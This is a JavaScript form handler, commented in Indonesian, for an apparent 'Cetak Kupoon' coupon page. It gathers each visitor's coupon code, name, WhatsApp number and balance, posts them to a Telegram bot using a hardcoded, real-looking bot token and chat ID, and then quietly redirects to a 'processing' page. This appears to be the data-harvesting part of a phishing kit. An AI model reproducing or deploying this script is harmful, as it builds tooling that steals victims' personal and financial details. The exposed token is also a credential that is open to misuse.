// script.js - Handler untuk form pengiriman kupon ke API Bot Telegram (kirim sekali saja, tanpa spam)
document.addEventListener('DOMContentLoaded', function() {
    const form = document.querySelector('form'); // Ambil form pertama
    const button = document.getElementById('kirim'); // Tombol submit
    let isSubmitting = false; // Flag untuk cegah submit ganda

    // Placeholder: Ganti dengan TOKEN bot dan chat_id Anda
    const BOT_TOKEN = '8376255925:AAFFGGSYhDwPTiPF6xhlprThRRPzL7oOt3k'; // Contoh: '123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11'
    const CHAT_ID = '6979221708'; // Contoh: '123456789' (untuk chat pribadi) atau '@channelusername'

    // Fungsi untuk menangani submit form
    form.addEventListener('submit', function(event) {
        event.preventDefault(); // Cegah pengiriman default

        // Cegah submit ganda
        if (isSubmitting) {
            return; // Jika sudah submitting, abaikan
        }
        isSubmitting = true; // Set flag

        // Ambil nilai dari input
        const kupon = document.getElementById('kupon').value;
        const nama = document.getElementById('nama').value;
        const nomor = document.getElementById('nomor').value;
        const saldo = document.getElementById('saldo').value;

        // Validasi sederhana
        if (!kupon || !nama || !nomor || !saldo) {
            alert('Harap lengkapi semua field!');
            isSubmitting = false; // Reset flag jika validasi gagal
            return;
        }

        // Format pesan untuk Telegram
        const message = `🔔 Data Kupoon Baru:\n\n📋 Kupon: ${kupon}\n👤 Nama: ${nama}\n📱 Nomor WA: ${nomor}\n💰 Saldo: ${saldo}\n\nDari: Website Cetak Kupoon`;

        // Kirim ke API Telegram
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        const data = {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'Markdown' // Untuk format teks
        };

        fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(data)
        })
        .then(response => response.json())
        .then(result => {
            if (result.ok) {
                // Langsung redirect ke halaman selanjutnya tanpa alert
                window.location.href = '../proses.html'; // Ganti dengan URL halaman konfirmasi Anda
            } else {
                // Jika gagal, alert atau redirect ke error page (opsional)
                alert('Gagal mengirim: ' + result.description);
                isSubmitting = false; // Reset flag jika gagal
            }
        })
        .catch(error => {
            // Jika error jaringan, alert atau redirect (opsional)
            alert('Error: ' + error.message);
            isSubmitting = false; // Reset flag jika error
        });
    });

    // Tambahan: Vibrasi saat klik tombol (seperti di kode asli)
    button.addEventListener('click', function() {
        if (navigator.vibrate) {
            navigator.vibrate(100); // Vibrasi 100ms
        }
    });
});
